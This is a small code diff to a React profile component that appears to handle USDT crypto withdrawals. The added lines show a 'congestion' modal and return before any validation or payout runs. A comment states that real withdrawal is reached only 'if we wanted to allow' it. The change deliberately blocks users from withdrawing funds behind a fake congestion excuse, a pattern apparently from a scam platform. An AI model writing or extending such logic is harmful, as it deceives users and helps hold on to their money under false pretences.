@@ -265,7 +265,11 @@ export function ProfileTab() {
       return;
     }
 
-    // 3. Validation
+    // 3. Third Gate: Show Congestion Modal if everything else is met
+    setShowCongestionModal(true);
+    return;
+
+    // 4. Validation (Reached only if we wanted to allow real withdrawal)
     const amount = parseUSDT(withdrawAmount);
     
     if (!amount || amount < MIN_WITHDRAWAL * 10000) {
